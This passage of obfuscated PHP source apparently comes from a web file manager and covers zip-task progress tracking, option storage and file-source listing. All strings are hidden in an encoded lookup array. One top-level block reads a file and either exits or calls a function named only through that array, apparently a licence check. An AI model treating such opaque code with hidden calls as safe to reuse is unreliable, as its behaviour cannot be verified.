$Øœè•ğ¨[$½ƒäÕ©ƒ[79]]; $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[1121]] = 1; $ÜÅÀ»‘² = 0; $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[1814]] = array($½ƒäÕ©ƒ[1815] => $ÜÅÀ»‘² + 1, $½ƒäÕ©ƒ[494] => $Øœè•ğ¨[$½ƒäÕ©ƒ[32]], $½ƒäÕ©ƒ[87] => $Øœè•ğ¨[$½ƒäÕ©ƒ[87]], $½ƒäÕ©ƒ[582] => $Øœè•ğ¨[$½ƒäÕ©ƒ[582]] ? $Øœè•ğ¨[$½ƒäÕ©ƒ[582]] : $Øœè•ğ¨[$½ƒäÕ©ƒ[87]]); $this->update(); } public function zipEvent($ÃĞÈÄÎ, $ÇÊì£¼ü, $’îÅª¨, $È—Î¢ş†) { $ä¯ç¡Ûş =& $_SERVER[‹è™Ü¸Ñ]; $ùÓ÷§¹² =& $this->task; $ùÓ÷§¹²[$ä¯ç¡Ûş[1803]] = get_path_this($ÇÊì£¼ü); $ùÓ÷§¹²[$ä¯ç¡Ûş[1805]] = $È—Î¢ş†; $ùÓ÷§¹²[$ä¯ç¡Ûş[1806]] = $’îÅª¨; $ùÓ÷§¹²[$ä¯ç¡Ûş[1123]] = $ÃĞÈÄÎ == $ä¯ç¡Ûş[1872] ? $ä¯ç¡Ûş[1873] : $ä¯ç¡Ûş[1874]; $ùÓ÷§¹²[$ä¯ç¡Ûş[1807]] = $ä¯ç¡Ûş[12]; $ùÓ÷§¹²[$ä¯ç¡Ûş[818]] = $È—Î¢ş†; $ùÓ÷§¹²[$ä¯ç¡Ûş[1870]] = $ä¯ç¡Ûş[389]; $this->update(); } public function unzipAfter($ÑÓÓ×˜Í) { $ŒöôéÁ =& $_SERVER[‹è™Ü¸Ñ]; $Ìçå¾¸” =& $this->task; $Ìçå¾¸”[$ŒöôéÁ[1870]] = $ŒöôéÁ[110]; $µ“—ß = IO::infoWithChildren($ÑÓÓ×˜Í); $²§òİÓÏ = 0; $Ìçå¾¸”[$ŒöôéÁ[1814]] = array($ŒöôéÁ[1815] => $²§òİÓÏ + 1, $ŒöôéÁ[494] => $µ“—ß[$ŒöôéÁ[32]], $ŒöôéÁ[87] => $µ“—ß[$ŒöôéÁ[87]], $ŒöôéÁ[582] => $µ“—ß[$ŒöôéÁ[582]] ? $µ“—ß[$ŒöôéÁ[582]] : $µ“—ß[$ŒöôéÁ[87]]); if ($µ“—ß[$ŒöôéÁ[33]] == $ŒöôéÁ[230]) { $Ìçå¾¸”[$ŒöôéÁ[1121]] = 1; } else { $Ìçå¾¸”[$ŒöôéÁ[1121]] = $µ“—ß[$ŒöôéÁ[82]][$ŒöôéÁ[80]]; } $Ìçå¾¸”[$ŒöôéÁ[1123]] = $ŒöôéÁ[12]; $Ìçå¾¸”[$ŒöôéÁ[1807]] = 0; $Ìçå¾¸”[$ŒöôéÁ[1753]] = 0; $Ìçå¾¸”[$ŒöôéÁ[1805]] = 0; $Ìçå¾¸”[$ŒöôéÁ[1806]] = 0; $Ìçå¾¸”[$ŒöôéÁ[1803]] = $ŒöôéÁ[12]; $Ìçå¾¸”[$ŒöôéÁ[1810]] = 0; $Ìçå¾¸”[$ŒöôéÁ[818]] = $µ“—ß[$ŒöôéÁ[79]]; $this->update(); self::log($ŒöôéÁ[1875] . json_encode(array($Ìçå¾¸”, $µ“—ß))); } public function nameParse($±«ÃåØÔ) { $ÓÚ¼¥ƒ =& $_SERVER[‹è™Ü¸Ñ]; $‘ş‰ßÌƒ =& $this->task; if ($‘ş‰ßÌƒ[$ÓÚ¼¥ƒ[1870]] == $ÓÚ¼¥ƒ[1259]) { $‘ş‰ßÌƒ[$ÓÚ¼¥ƒ[1870]] = $ÓÚ¼¥ƒ[389]; $‘ş‰ßÌƒ[$ÓÚ¼¥ƒ[1810]] = 0; $‘ş‰ßÌƒ[$ÓÚ¼¥ƒ[818]] = 0; } $À‚¬Ã… = get_path_this($±«ÃåØÔ); if (strstr($À‚¬Ã…, $ÓÚ¼¥ƒ[10])) { $‘ş‰ßÌƒ[$ÓÚ¼¥ƒ[1753]] += 1; $‘ş‰ßÌƒ[$ÓÚ¼¥ƒ[1121]] += 1; } $‘ş‰ßÌƒ[$ÓÚ¼¥ƒ[1803]] = $±«ÃåØÔ; $this->update(); } } if ($_SERVER[$_SERVER[‹è™Ü¸Ñ][931]] != $_SERVER[$_SERVER[‹è™Ü¸Ñ][1669]]) { $_getc = $_SERVER[‹è™Ü¸Ñ][934]; $_getfile = $_SERVER[$_SERVER[‹è™Ü¸Ñ][935]] . $_SERVER[‹è™Ü¸Ñ][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹è™Ü¸Ñ][262], $_getfilec); if (count($_getarrs) < $_SERVER[‹è™Ü¸Ñ][692]) { $exit = $_SERVER[‹è™Ü¸Ñ][937]; $exit(); } $_act = $_SERVER[‹è™Ü¸Ñ][1605]; $_act($_SERVER[$_SERVER[‹è™Ü¸Ñ][932]]); } class TaskZip extends TaskFileTransfer { protected function startAfter() { $™õàŸå =& $_SERVER[‹è™Ü¸Ñ]; parent::startAfter(); Hook::bind($™õàŸå[1876], array($this, $™õàŸå[1866])); Hook::bind($™õàŸå[1868], array($this, $™õàŸå[1869])); $ï¹ñ´¸í =& $this->task; $ï¹ñ´¸í[$™õàŸå[1870]] = $™õàŸå[1259]; if (!$ï¹ñ´¸í[$™õàŸå[1639]]) { $ï¹ñ´¸í[$™õàŸå[1639]] = LNG($™õàŸå[1877]); } } protected function endAfter() { $œİœˆª£ =& $_SERVER[‹è™Ü¸Ñ]; parent::endAfter(); Hook::unbind($œİœˆª£[1876], array($this, $œİœˆª£[1866])); Hook::unbind($œİœˆª£[1868], array($this, $œİœˆª£[1869])); } public function updateAfter() { $òğ©íğ =& $_SERVER[‹è™Ü¸Ñ]; $Ò„’Ó´Í =& $this->task; if (!$Ò„’Ó´Í[$òğ©íğ[1121]] || !$Ò„’Ó´Í[$òğ©íğ[818]]) { return; } if ($Ò„’Ó´Í[$òğ©íğ[1870]] == $òğ©íğ[1259]) { $ú•£ÕÃã = $Ò„’Ó´Í[$òğ©íğ[1806]]; if ($Ò„’Ó´Í[$òğ©íğ[1807]] != $òğ©íğ[1259]) { $ú•£ÕÃã = 0; } $™ñÛşˆ… = ($Ò„’Ó´Í[$òğ©íğ[1810]] + $ú•£ÕÃã) / $Ò„’Ó´Í[$òğ©íğ[818]]; $Ò„’Ó´Í[$òğ©íğ[1754]] = $™ñÛşˆ… * 0.3; } else { if ($Ò„’Ó´Í[$òğ©íğ[1870]] == $òğ©íğ[389]) { $™ñÛşˆ… = $Ò„’Ó´Í[$òğ©íğ[1753]] / $Ò„’Ó´Í[$òğ©íğ[1121]]; $Ò„’Ó´Í[$òğ©íğ[1754]] = 0.3 + $™ñÛşˆ… * 0.5; } else { if ($Ò„’Ó´Í[$òğ©íğ[1870]] == $òğ©íğ[110]) { $™ñÛşˆ… = 0; if ($Ò„’Ó´Í[$òğ©íğ[1805]]) { $™ñÛşˆ… = $Ò„’Ó´Í[$òğ©íğ[1806]] / $Ò„’Ó´Í[$òğ©íğ[1805]]; } $Ò„’Ó´Í[$òğ©íğ[1754]] = 0.3 + 0.5 + $™ñÛşˆ… * 0.2; } } } if ($Ò„’Ó´Í[$òğ©íğ[1754]] > 0) { $ö—åß± = timeFloat() - $Ò„’Ó´Í[$òğ©íğ[1756]] - $Ò„’Ó´Í[$òğ©íğ[1759]]; $Ò„’Ó´Í[$òğ©íğ[1760]] = $ö—åß± * (1 - $Ò„’Ó´Í[$òğ©íğ[1754]]) / $Ò„’Ó´Í[$òğ©íğ[1754]]; } } public function copyFileStart($³¼¡›Ñº, $Õ¨Õí›Ì, $Á¾ªòí, $ÜüÀ—øÉ, $ìÍ×¶â€, $£ü¿Öà) { $ª–ä‚İ‹ =& $_SERVER[‹è™Ü¸Ñ]; parent::copyFileStart($³¼¡›Ñº, $Õ¨Õí›Ì, $Á¾ªòí, $ÜüÀ—øÉ, $ìÍ×¶â€, $£ü¿Öà); $íûÄ¨°Ö =& $this->task; if ($íûÄ¨°Ö[$ª–ä‚İ‹[1870]] == $ª–ä‚İ‹[389]) { $íûÄ¨°Ö[$ª–ä‚İ‹[1870]] = $ª–ä‚İ‹[110]; } $this->update(); } public function copyFileEnd($Ã¦ì­ºê, $„·Ñ§, $ÜŞ‘£µ, $ë”ìÒÜŞ, $õÂ©ğ£õ, $ğ£¡¥¦Ğ) { $ª©ŸŠ† =& $_SERVER[‹è™Ü¸Ñ]; $ÇÇÛçÈ† =& $this->task; $ÇÇÛçÈ†[$ª©ŸŠ†[1806]] = $ÇÇÛçÈ†[$ª©ŸŠ†[1805]]; $ÇÇÛçÈ†[$ª©ŸŠ†[1810]] += $ÇÇÛçÈ†[$ª©ŸŠ†[1805]]; $ÇÇÛçÈ†[$ª©ŸŠ†[1807]] = $ª©ŸŠ†[12]; $this->update(); } public function zipEvent($Úİ¡ˆ¸ö, $šíšŒÏ¸, $­çäµïâ, $õÁ×ˆ) { $³Î£‡Éß =& $_SERVER[‹è™Ü¸Ñ]; $¯òôÄßÅ =& $this->task; $¯òôÄßÅ[$³Î£‡Éß[1803]] = get_path_this($šíšŒÏ¸); $¯òôÄßÅ[$³Î£‡Éß[1805]] = $õÁ×ˆ; $¯òôÄßÅ[$³Î£‡Éß[1806]] = $­çäµïâ; $¯òôÄßÅ[$³Î£‡Éß[1123]] = $Úİ¡ˆ¸ö == $³Î£‡Éß[1878] ? $³Î£‡Éß[1873] : $³Î£‡Éß[1874]; $¯òôÄßÅ[$³Î£‡Éß[1807]] = $³Î£‡Éß[12]; $¯òôÄßÅ[$³Î£‡Éß[818]] = $õÁ×ˆ; $¯òôÄßÅ[$³Î£‡Éß[1870]] = $³Î£‡Éß[389]; $this->update(); } public function nameParse($…œŞ»–Ù) { $·Åèßƒ‹ =& $_SERVER[‹è™Ü¸Ñ]; $ÆóÑĞ”÷ =& $this->task; if ($ÆóÑĞ”÷[$·Åèßƒ‹[1753]] < $ÆóÑĞ”÷[$·Åèßƒ‹[1121]]) { $­ÕÚà–À = get_path_this($…œŞ»–Ù); if (strstr($­ÕÚà–À, $·Åèßƒ‹[10])) { $ÆóÑĞ”÷[$·Åèßƒ‹[1753]] += 1; } } if ($ÆóÑĞ”÷[$·Åèßƒ‹[1870]] == $·Åèßƒ‹[1259]) { $ÆóÑĞ”÷[$·Åèßƒ‹[1870]] = $·Åèßƒ‹[389]; } $ÆóÑĞ”÷[$·Åèßƒ‹[1803]] = $…œŞ»–Ù; $this->update(); } } goto F¯õÄÊ¬ƒô; D†§ÇåùÎØ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\155\117\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($øÈğë¶… = false, $ö³ûí¡¿ = "\155\157\144\x69\146\x79\124\x69\155\x65", $ñØ½æ€È = false) { $Ùí«¸üÓ = Model($this->modelType)->get(!1, $this->optionType, !0); $ò¨‡Ç†É = array_values($Ùí«¸üÓ); if ($ò¨‡Ç†É && $ò¨‡Ç†É[0] && !is_array($ò¨‡Ç†É[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ùí«¸üÓ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ùí«¸üÓ) { return $øÈğë¶… ? null : array(); } if (!$øÈğë¶…) { $Ùí«¸üÓ = array_filter(array_values($Ùí«¸üÓ)); return array_sort_by($Ùí«¸üÓ, $ö³ûí¡¿, $ñØ½æ€È); } return $Ùí«¸üÓ[$_SERVER[‹è™Ü¸Ñ][472] . $øÈğë¶…]; } public function insert($úÜÅ–×è) { $ÅâÜôÜ‡ =& $_SERVER[‹è™Ü¸Ñ]; $úÜÅ–×è = array_field_key($úÜÅ–×è, $this->field); $èØ‘ïùé = Model($this->modelType)->get($ÅâÜôÜ‡[473], $this->optionType . $ÅâÜôÜ‡[474]); $èØ‘ïùé = $èØ‘ïùé ? $èØ‘ïùé : 0; $úÜÅ–×è[$ÅâÜôÜ‡[475]] = ++$èØ‘ïùé; $úÜÅ–×è[$ÅâÜôÜ‡[231]] = time(); $úÜÅ–×è[$ÅâÜôÜ‡[88]] = time(); Model($this->modelType)->set($ÅâÜôÜ‡[473], $èØ‘ïùé, $this->optionType . $ÅâÜôÜ‡[474]); Model($this->modelType)->set($ÅâÜôÜ‡[472] . $èØ‘ïùé, $úÜÅ–×è, $this->optionType); return $èØ‘ïùé; } public function update($öÑ¡ÇÔ, $±Àú„äÉ) { $Şô½çå =& $_SERVER[‹è™Ü¸Ñ]; $±Àú„äÉ = array_field_key($±Àú„äÉ, $this->field); $€ØÃ÷Å = $this->listData($öÑ¡ÇÔ); if (!$€ØÃ÷Å || !$öÑ¡ÇÔ) { return !1; } $±Àú„äÉ = array_merge($€ØÃ÷Å, $±Àú„äÉ); $±Àú„äÉ[$Şô½çå[88]] = time(); return Model($this->modelType)->set($Şô½çå[472] . $öÑ¡ÇÔ, $±Àú„äÉ, $this->optionType); } public function remove($êºÅÒü) { if (!$êºÅÒü) { return !1; } return Model($this->modelType)->remove($_SERVER[‹è™Ü¸Ñ][472] . $êºÅÒü, $this->optionType); } public function clear() { $š¡“Ÿ«Ï =& $_SERVER[‹è™Ü¸Ñ]; Model($this->modelType)->remove($š¡“Ÿ«Ï[473], $this->optionType . $š¡“Ÿ«Ï[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($öÎŞ½îã, $¡®é…Ëí) { if (!$¡®é…Ëí) { return !1; } $½úÍ¹ºœ = $this->listData(); $½úÍ¹ºœ = array_to_keyvalue($½úÍ¹ºœ, $öÎŞ½îã); return isset($½úÍ¹ºœ[$¡®é…Ëí]) ? $½úÍ¹ºœ[$¡®é…Ëí] : !1; } public function findByName($áÖÚ©Æ) { return $this->findByKey($_SERVER[‹è™Ü¸Ñ][32], $áÖÚ©Æ); } protected function resetData($î¯ĞƒòÁ) { $ƒŠî×‡ï =& $_SERVER[‹è™Ü¸Ñ]; $î¯ĞƒòÁ = is_array($î¯ĞƒòÁ) ? $î¯ĞƒòÁ : array(); $÷°ºâï× = array(); for ($÷ú‹”©ì = 0; $÷ú‹”©ì < count($î¯ĞƒòÁ); $÷ú‹”©ì++) { $÷°ºâï×[$ƒŠî×‡ï[472] . $î¯ĞƒòÁ[$÷ú‹”©ì][$ƒŠî×‡ï[475]]] = $î¯ĞƒòÁ[$÷ú‹”©ì]; } return Model($this->modelType)->set($÷°ºâï×, !1, $this->optionType); } private function getAutoName($²°¡¹Ğ) { $÷™È¥…» = array_to_keyvalue($this->listData(), $_SERVER[‹è™Ü¸Ñ][32]); if (!$÷™È¥…» || !isset($÷™È¥…»[$²°¡¹Ğ])) { return $²°¡¹Ğ; } for ($ˆ•½É = 1; $ˆ•½É < count($÷™È¥…»); $ˆ•½É++) { $ëƒÎ° = $²°¡¹Ğ . "\x28{$ˆ•½É}\x29"; if (!isset($÷™È¥…»[$ëƒÎ°])) { return $ëƒÎ°; } } return $ëƒÎ°; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Â›²¥¼Ì = false, $¹€áÜ = '', $­£Ùßâ = false) { $“»¿¿â” =& $_SERVER[‹è™Ü¸Ñ]; $İÆçªÒë = $this->cacheGet($¹€áÜ); $ñÉ‚ÂÎ = $this->optionDefault($¹€áÜ); $ñÉ‚ÂÎ = is_array($ñÉ‚ÂÎ) ? $ñÉ‚ÂÎ : array(); if (is_array($İÆçªÒë)) { $İÆçªÒë = array_merge($ñÉ‚ÂÎ, $İÆçªÒë); return $Â›²¥¼Ì ? isset($İÆçªÒë[$Â›²¥¼Ì]) ? $İÆçªÒë[$Â›²¥¼Ì] : null : $İÆçªÒë; } $í£ø€ıâ = $this->filterWhere(array($“»¿¿â”[33] => $¹€áÜ)); $İÆçªÒë = $this->where($í£ø€ıâ)->select(); $İÆçªÒë = array_to_keyvalue($İÆçªÒë, $“»¿¿â”[97], $“»¿¿â”[450]); foreach ($İÆçªÒë as $”Ñİç¼– => $ø§±ÊĞ) { if ($­£Ùßâ || in_array($”Ñİç¼–, $this->jsonField)) { $İÆçªÒë[$”Ñİç¼–] = json_decode($ø§±ÊĞ, !0); } } $this->cacheSet($¹€áÜ, $İÆçªÒë); $İÆçªÒë = array_merge($ñÉ‚ÂÎ, $İÆçªÒë); return $Â›²¥¼Ì ? $İÆçªÒë[$Â›²¥¼Ì] : $İÆçªÒë; } public function set($ ÛÁé¥ø, $úá°ÃÔÅ = false, $üŸ„É³ò = '') { $›ªöáñŒ =& $_SERVER[‹è™Ü¸Ñ]; $this->cacheRemove($üŸ„É³ò); $âíÔ÷ò‹ = array(); $Õäáµì‹ = is_array($ ÛÁé¥ø) ? $ ÛÁé¥ø : array($ ÛÁé¥ø => $úá°ÃÔÅ); foreach ($Õäáµì‹ as $µßÊ”úª => $üÛ·‡¬Ú) { if (is_array($üÛ·‡¬Ú)) { $üÛ·‡¬Ú = json_encode_force($üÛ·‡¬Ú); } $this->checkLength($üÛ·‡¬Ú, !1, $this->tableName . $›ªöáñŒ[4] . $ ÛÁé¥ø); $üÛ·‡¬Ú = self::textEncode($üÛ·‡¬Ú); $Õäáµì‹ = array($›ªöáñŒ[33] => $üŸ„É³ò, $›ªöáñŒ[97] => $µßÊ”úª, $›ªöáñŒ[450] => $üÛ·‡¬Ú); $âíÔ÷ò‹[] = $this->filterWhere($Õäáµì‹); } if (!$âíÔ÷ò‹) { return !0; } $‡¢Ü•Ã = $this->cacheKey($›ªöáñŒ[476]); CacheLock::lock($‡¢Ü•Ã); $ÊƒàæÚ› = $this->addAll($âíÔ÷ò‹, array(), !0); CacheLock::unlock($‡¢Ü•Ã); return $ÊƒàæÚ›; } protected function optionDefault($ËØ÷Óœ¡ = '') { return !1; } public function setDeep($§²û…ç, $ñğôÎ»˜ = false, $â—åíÓ™ = '') { $ƒïŒÒ = explode($_SERVER[‹è™Ü¸Ñ][10], $§²û…ç); $ê½˜®Œà = $this->get(); array_set_value($ê½˜®Œà, $§²û…ç, $ñğôÎ»˜); $this->set($ƒïŒÒ[0], $ê½˜®Œà[$ƒïŒÒ[0]], $â—åíÓ™); } public function remove($ñ¸ÃÎ¿£, $™àéâøã = '') { $ŠÅ¯òáÓ =& $_SERVER[‹è™Ü¸Ñ]; $this->cacheRemove($™àéâøã); $è‰Ü‚Ÿµ = $this->filterWhere(array($ŠÅ¯òáÓ[97] => $ñ¸ÃÎ¿£, $ŠÅ¯òáÓ[33] => $™àéâøã)); if (is_null($ñ¸ÃÎ¿£)) { unset($è‰Ü‚Ÿµ[$ŠÅ¯òáÓ[97]]); } return $this->where($è‰Ü‚Ÿµ)->delete(); } public function cacheSet($ô€ãÈÛÙ, $‹†´ÚİÆ = false) { return Cache::set($this->cacheKey($ô€ãÈÛÙ), $‹†´ÚİÆ); } public function cacheGet($œÉ®ŞÔ•) { return Cache::get($this->cacheKey($œÉ®ŞÔ•)); } public function cacheRemove($ĞØ¾Ü‘ñ) { return Cache::remove($this->cacheKey($ĞØ¾Ü‘ñ)); } protected function filterWhere($‡ï¾äƒ‘) { return $‡ï¾äƒ‘; } protected function cacheKey($¦¦ïÁ) { return $¦¦ïÁ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\x63\145"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\141\155\x65" => "\151\x6f\137\163\157\165\x72\x63\145\137\x6d\x65\x74\x61", "\x6d\x65\x74\x61\106\x69\145\x6c\x64" => "\x73\x6f\x75\162\143\x65\111\104"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\x73\x65\162\164", "\146\x75\x6e\x63\164\151\157\156"), array("\143\162\145\141\164\145\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\156\x73\145\162\x74", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\x76\x69\145\167\x54\x69\x6d\145", "\x74\151\x6d\x65", "\x69\156\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($—ò‡Ü±÷) { return $this->listSource(array($_SERVER[‹è™Ü¸Ñ][477] => $—ò‡Ü±÷)); } public function typeName($ÁèÀ¨­‚) { static $àÓıÁã = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $àÓıÁã[$ÁèÀ¨­‚ . $_SERVER[‹è™Ü¸Ñ][12]]; } public function sourceListInfo($øÉÚû¿·, $ÁÏÉ÷›ì = false) { $ì­Áí«¬ =& $_SERVER[‹è™Ü¸Ñ]; $øÉÚû¿· = $øÉÚû¿· ? $øÉÚû¿· : array(); $øÉÚû¿· = array_filter(array_unique($øÉÚû¿·)); if (!$øÉÚû¿·) { return array(); } $í¦şàôÑ = $this->where(array($ì­Áí«¬[193] => array($ì­Áí«¬[7], $øÉÚû¿·)))->select(); $this->_listDataApply($í¦şàôÑ, $ÁÏÉ÷›ì); return array_to_keyvalue($í¦şàôÑ, $ì­Áí«¬[193]); } public function pathInfoFilter(&$¤µëéğ) { $®ŞÁÒÜí =& $_SERVER[‹è™Ü¸Ñ]; static $ÔóğÓ‡º = false; static $œ®¨øÆ = false; static $´ö¬üÏà = false; if (!$ÔóğÓ‡º) { $Õ²–¯‘é = $®ŞÁÒÜí[478]; $Õ²–¯‘é .= $®ŞÁÒÜí[479]; $Õ²–¯‘é .= $®ŞÁÒÜí[480]; $šššÃ®¥ = $®ŞÁÒÜí[481]; $ş‡ –÷ô = explode($®ŞÁÒÜí[50], $šššÃ®¥); $ÔóğÓ‡º = explode($®ŞÁÒÜí[50], $Õ²–¯‘é); $œ®¨øÆ = array(); foreach ($ÔóğÓ‡º as $„·÷ÃŞ¹) { if (in_array($„·÷ÃŞ¹, $ş‡ –÷ô)) { continue; } $œ®¨øÆ[] = $„·÷ÃŞ¹; } $´ö¬üÏà = explode($®ŞÁÒÜí[50], $®ŞÁÒÜí[482]); } foreach ($´ö¬üÏà as $Ç­óÀî¯) { if (isset($¤µëéğ[$Ç­óÀî¯])) { $¤µëéğ[$Ç­óÀî¯] = intval($¤µëéğ[$Ç­óÀî¯]); } } $¤µëéğ[$®ŞÁÒÜí[87]] = $®ŞÁÒÜí[483] . $¤µëéğ[$®ŞÁÒÜí[193]] . $®ŞÁÒÜí[484]; $¤µëéğ[$®ŞÁÒÜí[33]] = $¤µëéğ[$®ŞÁÒÜí[485]] == 1 ? $®ŞÁÒÜí[78] : $®ŞÁÒÜí[230]; $¤µëéğ[$®ŞÁÒÜí[190]] = $this->typeName($¤µëéğ[$®ŞÁÒÜí[190]]); if ($¤µëéğ[$®ŞÁÒÜí[485]] != 1) { $¤µëéğ[$®ŞÁÒÜí[169]] = $¤µëéğ[$®ŞÁÒÜí[486]]; unset($¤µëéğ[$®ŞÁÒÜí[486]]); } $Å¹„”À = $ÔóğÓ‡º; if (isset($¤µëéğ[$®ŞÁÒÜí[487]]) && $¤µëéğ[$®ŞÁÒÜí[487]][$®ŞÁÒÜí[488]] == -1) { $Å¹„”À = $œ®¨øÆ; } $¤µëéğ = array_field_key($¤µëéğ, $Å¹„”À); return $¤µëéğ; } public function listUserFav() { $²¨å =& $_SERVER[‹è™Ü¸Ñ]; $ÌÈ“Œ©¶ = Model($²¨å[489])->listData(); $°¯öëéù = array_filter_by_field($ÌÈ“Œ©¶, $²¨å[33], $²¨å[490]); $°¯öëéù = array_to_keyvalue($°¯öëéù, $²¨å[12], $²¨å[87]); if ($°¯öëéù) { $¦«÷€Ã = $this->listSource(array($²¨å[491] => array($²¨å[492], $°¯öëéù))); } $¦«÷€Ã = array_to_keyvalue($¦«÷€Ã[$²¨å[445]], $²¨å[193]); foreach ($ÌÈ“Œ©¶ as &$ç›Ñ‡ˆÔ) { $ç›Ñ‡ˆÔ = array($²¨å[493] => $ç›Ñ‡ˆÔ[$²¨å[475]], $²¨å[494] => $ç›Ñ‡ˆÔ[$²¨å[32]], $²¨å[495] => $ç›Ñ‡ˆÔ[$²¨å[87]], $²¨å[496] => $ç›Ñ‡ˆÔ[$²¨å[33]], $²¨å[497] => $ç›Ñ‡ˆÔ[$²¨å[231]], $²¨å[498] => $ç›Ñ‡ˆÔ[$²¨å[88]]); if ($ç›Ñ‡ˆÔ[$²¨å[33]] == $²¨å[490] && $¦«÷€Ã[$ç›Ñ‡ˆÔ[$²¨å[87]]]) { $ç›Ñ‡ˆÔ[$²¨å[90]] = $¦«÷€Ã[$ç›Ñ‡ˆÔ[$²¨å[87]]]; } } unset($ç›Ñ‡ˆÔ); return $ÌÈ“Œ©¶; } public function listUserTag($´«İŠ) { $Ö§•Ÿ¨¾ =& $_SERVER[‹è™Ü¸Ñ]; if ($´«İŠ && !is_array($´«İŠ)) { $´«İŠ = array($´«İŠ); } $—†£»¶ = Model($Ö§•Ÿ¨¾[499])->listData(); $ôÓ›Ãœ‰ = array(); $È°×ÂëÎ = array(); foreach ($—†£»¶ as $Ù¸¸§·) { $ÊûŠÀ³ = $Ù¸¸§·[$Ö§•Ÿ¨¾[87]]; if (!$ÊûŠÀ³) { continue; } if (!isset($È°×ÂëÎ[$ÊûŠÀ³])) { $È°×ÂëÎ[$ÊûŠÀ³] = array(); } $È°×ÂëÎ[$ÊûŠÀ³][] = $Ù¸¸§·[$Ö§•Ÿ¨¾[500]]; $ôÓ›Ãœ‰[$Ù¸¸§·[$Ö§•Ÿ¨¾[87]]] = $Ù¸¸§·; } $ïñ´·İì = array(); $Â×âÆø‘ = array(); $ì„¥ŸÚú = array(); foreach ($È°×ÂëÎ as $ˆ§ç½ñÔ => $ÍíËïÑ) { $ÓéªÓ‹… = !0; if (!$´«İŠ) { $ïñ´·İì[] = $ˆ§ç½ñÔ; continue; } foreach ($´«İŠ as $Ò°æ‹§Ë) { if (!in_array($Ò°æ‹§Ë, $ÍíËïÑ)) { $ÓéªÓ‹… = !1; break; } } if (!$ÓéªÓ‹…) { continue; } if (!is_numeric($ˆ§ç½ñÔ)) { $Áë¦ƒ = $ôÓ›Ãœ‰[$ˆ§ç½ñÔ]; $ ®ÅÖŞõ = array($Ö§•Ÿ¨¾[32] => $Áë¦ƒ[$Ö§•Ÿ¨¾[32]], $Ö§•Ÿ¨¾[87] => $Áë¦ƒ[$Ö§•Ÿ¨¾[87]], $Ö§•Ÿ¨¾[33] => $Áë¦ƒ[$Ö§•Ÿ¨¾[33]], $Ö§•Ÿ¨¾[90] => array($Ö§•Ÿ¨¾[501] => 1), $Ö§•Ÿ¨¾[232] => !0); if ($Áë¦ƒ[$Ö§•Ÿ¨¾[33]] == $Ö§•Ÿ¨¾[230]) { $ì„¥ŸÚú[] = $ ®ÅÖŞõ; } if ($Áë¦ƒ[$Ö§•Ÿ¨¾[33]] == $Ö§•Ÿ¨¾[78]) { $Â×âÆø‘[] = $ ®ÅÖŞõ; } continue; } $ïñ´·İì[] = $ˆ§ç½ñÔ; } if ($ïñ´·İì) { $’””æ¹ = $this->listSource(array($Ö§•Ÿ¨¾[491] => array($Ö§•Ÿ¨¾[492], $ïñ´·İì))); } $’””æ¹ = $’””æ¹ ? $’””æ¹ : array($Ö§•Ÿ¨¾[85] => array(), $Ö§•Ÿ¨¾[86] => array()); $’””æ¹[$Ö§•Ÿ¨¾[85]] = array_merge($’””æ¹[$Ö§•Ÿ¨¾[85]], $Â×âÆø‘); $’””æ¹[$Ö§•Ÿ¨¾[86]] = array_merge($’””æ¹[$Ö§•Ÿ¨¾[86]], $ì„¥ŸÚú); if (isset($’””æ¹[$Ö§•Ÿ¨¾[442]]) && count($ïñ´·İì) == $’””æ¹[$Ö§•Ÿ¨¾[442]][$Ö§•Ÿ¨¾[443]]) { return $’””æ¹; } $ßµ®ŞÃ© = array(); $£àËÈ¢ = array_to_keyvalue($’””æ¹[$Ö§•Ÿ¨¾[85]], $Ö§•Ÿ¨¾[12], $Ö§•Ÿ¨¾[193]); $¬íåóš… = array_to_keyvalue($’””æ¹[$Ö§•Ÿ¨¾[86]], $Ö§•Ÿ¨¾[12], $Ö§•Ÿ¨¾[193]); $™¬ÁõÔ¯ = array_merge($¬íåóš…, $£àËÈ¢); foreach ($ïñ´·İì as $ÊûŠÀ³) { if (!in_array($ÊûŠÀ³, $™¬ÁõÔ¯)) { $ßµ®ŞÃ©[] = $ÊûŠÀ³; } } if ($ßµ®ŞÃ©) { Model($Ö§•Ÿ¨¾[502])->removeBySource($ßµ®ŞÃ©); } return $’””æ¹; } public function listUserRecycle() { $ˆÙÍú‡» =& $_SERVER[‹è™Ü¸Ñ]; $ò£şˆÑ = Model($ˆÙÍú‡»[503])->listData(); if (!$ò£şˆÑ) { return array(); } $™¡½ˆË = array($ˆÙÍú‡»[491] => array($ˆÙÍú‡»[492], $ò£şˆÑ), $ˆÙÍú‡»[504] => 1); return $this->listSource($™¡½ˆË); } public function listSource($ºœÊ¨¦î, $ÎîÙò¡ = 3000, $Ä÷œ¢ˆü = false) { $°üç‘Ñº =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($ºœÊ¨¦î[$°üç‘Ñº[505]])) { $ºœÊ¨¦î[$°üç‘Ñº[505]] = 0; } if (isset($ºœÊ¨¦î[$°üç‘Ñº[192]]) && $ºœÊ¨¦î[$°üç‘Ñº[192]] == 